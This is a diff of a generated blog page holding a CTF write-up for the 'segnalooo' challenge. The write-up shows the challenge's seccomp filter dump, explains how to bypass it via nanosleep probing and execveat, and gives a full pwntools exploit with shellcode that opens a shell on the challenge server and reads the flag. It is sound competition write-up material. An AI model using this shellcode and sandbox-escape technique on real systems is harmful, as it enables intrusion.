@@ -8,7 +8,7 @@
     
     
     
-    <link rel="stylesheet" href="../../css/theme.min.css">
+    <link rel="stylesheet" href="/css/theme.min.css">
 
     
     
@@ -20,11 +20,11 @@
         <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
     <div class="row">
         <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
-            <a href="../../" class="text-decoration-none">
+            <a href="/" class="text-decoration-none">
                 <img id="home-image" class="rounded-circle"
                     
                         
-                            src="../../images/zzlol.jpg"
+                            src="/images/zzlol.jpg"
                         
                     
                 />
@@ -32,7 +32,7 @@
         </div>
         <div class="col-sm-8 col-12 text-sm-left text-center">
             <h2 class="m-0 mb-2 mt-4">
-                <a href="../../" class="text-decoration-none">
+                <a href="/" class="text-decoration-none">
                     
                         mhibio
                     
@@ -47,29 +47,31 @@
                 
                 
                     <li class="list-inline-item">
-                        <a class="badge badge-white " style="font-size: 14px; padding: 0;" href="../../about/whoami/" title="About">About</a>
+                        <a class="badge badge-white " style="font-size: 14px; padding: 0;" href="post/" title="">Posts</a>
                     </li>
                 
                     <li class="list-inline-item">
-                        <a class="badge badge-white " style="font-size: 14px; padding: 0;" href="../../" title="Posts">Posts</a>
-                    </li>
-                
-                    <li class="list-inline-item">
-                        <a class="badge badge-white " style="font-size: 14px; padding: 0;" href="../../categories/" title="Categories">Categories</a>
+                        <a class="badge badge-white " style="font-size: 14px; padding: 0;" href="about/whoami" title="">About</a>
                     </li>
                 
             </ul>
             <ul id="nav-social" class="list-inline">
                 
                     <li class="list-inline-item mr-3">
-                        <a href="http://github.com/mhibio" target="_blank">
-                            <i class="fab fa-github fa-1x text-muted"></i>
+                        <a href="" target="_blank">
+                            <i class=" text-muted"></i>
                         </a>
                     </li>
                 
                     <li class="list-inline-item mr-3">
-                        <a href="https://mhibio.tistory.com/" target="_blank">
-                            <i class="fas fa-blog fa-1x text-muted"></i>
+                        <a href="" target="_blank">
+                            <i class=" text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="" target="_blank">
+                            <i class=" text-muted"></i>
                         </a>
                     </li>
                 
@@ -100,21 +102,21 @@
 </ol>
 <hr>
 <h3 id="seccomp-filter">Seccomp Filter</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"> line  CODE  JT   JF      K
-<span style="color:#f92672">=================================</span>
- <span style="color:#ae81ff">0000</span>: <span style="color:#ae81ff">0x20</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000004</span>  A <span style="color:#f92672">=</span> arch
- <span style="color:#ae81ff">0001</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x0a</span> <span style="color:#ae81ff">0xc000003e</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">!=</span> ARCH_X86_64) goto <span style="color:#ae81ff">0012</span>
- <span style="color:#ae81ff">0002</span>: <span style="color:#ae81ff">0x20</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000000</span>  A <span style="color:#f92672">=</span> sys_number
- <span style="color:#ae81ff">0003</span>: <span style="color:#ae81ff">0x35</span> <span style="color:#ae81ff">0x08</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x40000000</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0x40000000</span>) goto <span style="color:#ae81ff">0012</span>
- <span style="color:#ae81ff">0004</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x06</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x0000000b</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> munmap) goto <span style="color:#ae81ff">0011</span>
- <span style="color:#ae81ff">0005</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x05</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000023</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> nanosleep) goto <span style="color:#ae81ff">0011</span>
- <span style="color:#ae81ff">0006</span>: <span style="color:#ae81ff">0x20</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000008</span>  A <span style="color:#f92672">=</span> instruction_pointer
- <span style="color:#ae81ff">0007</span>: <span style="color:#ae81ff">0x25</span> <span style="color:#ae81ff">0x04</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x80000000</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x80000000</span>) goto <span style="color:#ae81ff">0012</span>
- <span style="color:#ae81ff">000</span><span style="color:#ae81ff">8</span>: <span style="color:#ae81ff">0x20</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000000</span>  A <span style="color:#f92672">=</span> sys_number
- <span style="color:#ae81ff">000</span><span style="color:#ae81ff">9</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x02</span> <span style="color:#ae81ff">0x01</span> <span style="color:#ae81ff">0x0000003b</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> execve) goto <span style="color:#ae81ff">0012</span> <span style="color:#66d9ef">else</span> goto <span style="color:#ae81ff">0011</span>
- <span style="color:#ae81ff">0010</span>: <span style="color:#ae81ff">0x06</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000000</span>  <span style="color:#66d9ef">return</span> KILL
- <span style="color:#ae81ff">0011</span>: <span style="color:#ae81ff">0x06</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x7fff0000</span>  <span style="color:#66d9ef">return</span> ALLOW
- <span style="color:#ae81ff">0012</span>: <span style="color:#ae81ff">0x06</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000000</span>  <span style="color:#66d9ef">return</span> KILL
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"> <span class="n">line</span>  <span class="n">CODE</span>  <span class="n">JT</span>   <span class="n">JF</span>      <span class="n">K</span>
+<span class="o">=================================</span>
+ <span class="mo">0000</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000004</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">arch</span>
+ <span class="mo">0001</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x0a</span> <span class="mh">0xc000003e</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">ARCH_X86_64</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0012</span>
+ <span class="mo">0002</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
+ <span class="mo">0003</span><span class="p">:</span> <span class="mh">0x35</span> <span class="mh">0x08</span> <span class="mh">0x00</span> <span class="mh">0x40000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">&gt;=</span> <span class="mh">0x40000000</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0012</span>
+ <span class="mo">0004</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x0000000b</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">munmap</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0011</span>
+ <span class="mo">0005</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x05</span> <span class="mh">0x00</span> <span class="mh">0x00000023</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">nanosleep</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0011</span>
+ <span class="mo">0006</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000008</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">instruction_pointer</span>
+ <span class="mo">0007</span><span class="p">:</span> <span class="mh">0x25</span> <span class="mh">0x04</span> <span class="mh">0x00</span> <span class="mh">0x80000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">&gt;</span> <span class="mh">0x80000000</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0012</span>
+ <span class="mo">000</span><span class="mi">8</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
+ <span class="mo">000</span><span class="mi">9</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x02</span> <span class="mh">0x01</span> <span class="mh">0x0000003b</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">execve</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0012</span> <span class="k">else</span> <span class="n">goto</span> <span class="mo">0011</span>
+ <span class="mo">0010</span><span class="p">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
+ <span class="mo">0011</span><span class="p">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mo">0012</span><span class="p">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
 </code></pre></div><p>Only <code>munmap</code> and <code>nanosleep</code> Syscall are available.<br>
 or, <code>Instruction_Pointer(IP)</code> have to be smaller than 0x80000000</p>
 <p><strong>But, all Memory is bigger than 0x80000000.</strong><br>
@@ -140,54 +142,54 @@ else <code>nanosleep's rdi</code> is valid memory but failed <code>nanosleep</co
 then, just excute <code>execveat(0, &quot;/bin/sh&quot;, 0, 0, 0)</code></p>
 <hr>
 <h3 id="exploit">Exploit</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>)
-context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;error&#39;</span>
+<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;error&#39;</span>
 
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pack64</span>(x):  <span style="color:#66d9ef">return</span> p64(x)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;hex&#34;</span>)
+<span class="k">def</span> <span class="nf">pack64</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>  <span class="k">return</span> <span class="n">p64</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)</span>
 
-sc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
-</span><span style="color:#e6db74">inc edi
-</span><span style="color:#e6db74">shl rdi, 44
-</span><span style="color:#e6db74">mov rsi, rsp
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">add rdi, 0x1000
-</span><span style="color:#e6db74">xor rax, rax
-</span><span style="color:#e6db74">mov al, 35
-</span><span style="color:#e6db74">syscall
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">cmp al, 0xea
-</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+<span class="n">sc</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span><span class="s1">inc edi
+</span><span class="s1">shl rdi, 44
+</span><span class="s1">mov rsi, rsp
+</span><span class="s1">
+</span><span class="s1">add rdi, 0x1000
+</span><span class="s1">xor rax, rax
+</span><span class="s1">mov al, 35
+</span><span class="s1">syscall
+</span><span class="s1">
+</span><span class="s1">cmp al, 0xea
+</span><span class="s1">&#39;&#39;&#39;</span>
 
-sc2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
-</span><span style="color:#e6db74">lea rbx, [rdi+0xb4]
-</span><span style="color:#e6db74">lea rsi, [rsp+0x30]
-</span><span style="color:#e6db74">xor rdi, rdi
-</span><span style="color:#e6db74">xor eax, eax
-</span><span style="color:#e6db74">mov ax, 322
-</span><span style="color:#e6db74">jmp rbx
-</span><span style="color:#e6db74">nop
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+<span class="n">sc2</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span><span class="s1">lea rbx, [rdi+0xb4]
+</span><span class="s1">lea rsi, [rsp+0x30]
+</span><span class="s1">xor rdi, rdi
+</span><span class="s1">xor eax, eax
+</span><span class="s1">mov ax, 322
+</span><span class="s1">jmp rbx
+</span><span class="s1">nop
+</span><span class="s1">
+</span><span class="s1">&#39;&#39;&#39;</span>
 
-pay <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;f1&#34;</span><span style="color:#f92672">+</span> asm(sc)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;hex&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;7405e9e6ffffff&#34;</span> <span style="color:#f92672">+</span> asm(sc2)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;hex&#34;</span>)
-pay <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;41&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x40</span> <span style="color:#f92672">-</span> (len(pay) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>))
-pay <span style="color:#f92672">+=</span> pack64(<span style="color:#ae81ff">0</span>)
-pay <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;90&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
-pay <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;2f62696e2f7368&#34;</span> <span style="color:#75715e">#binsh</span>
+<span class="n">pay</span> <span class="o">=</span> <span class="s2">&#34;f1&#34;</span><span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;7405e9e6ffffff&#34;</span> <span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="n">sc2</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="s2">&#34;41&#34;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x40</span> <span class="o">-</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span><span class="p">))</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">pack64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="s2">&#34;90&#34;</span><span class="o">*</span><span class="mh">0x20</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="s2">&#34;2f62696e2f7368&#34;</span> <span class="c1">#binsh</span>
 
-<span style="color:#66d9ef">while</span> True:
-    <span style="color:#75715e">#p = process(&#39;./stub&#39;)</span>
-    p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;segnalooo.challenges.ooo&#34;</span>, <span style="color:#ae81ff">4321</span>)
-    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Give me some code!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pay)
-    p<span style="color:#f92672">.</span>recvline()
-    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
-            p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;while read line;do echo </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">$line</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">;done &lt; /flag&#34;</span>)
-    res <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
-    <span style="color:#66d9ef">if</span> len(res) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
-            <span style="color:#66d9ef">print</span>(res)
-            exit()
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="c1">#p = process(&#39;./stub&#39;)</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;segnalooo.challenges.ooo&#34;</span><span class="p">,</span> <span class="mi">4321</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Give me some code!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
+            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;while read line;do echo </span><span class="se">\&#34;</span><span class="s2">$line</span><span class="se">\&#34;</span><span class="s2">;done &lt; /flag&#34;</span><span class="p">)</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
+            <span class="nb">exit</span><span class="p">()</span>
 </code></pre></div><hr>
 <h4 id="flag--ooos3riouslywh4tissigaltstack">Flag : <code>OOO{s3riously,wh4tISsigaltstack???}</code></h4>
 
@@ -198,7 +200,7 @@ pay <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;2f626
         </div><footer class="text-center pb-1">
     <small class="text-muted">
         
-            &copy; Copyright 2021, mhibio 🔥
+            This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.
         
         <br>
         Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
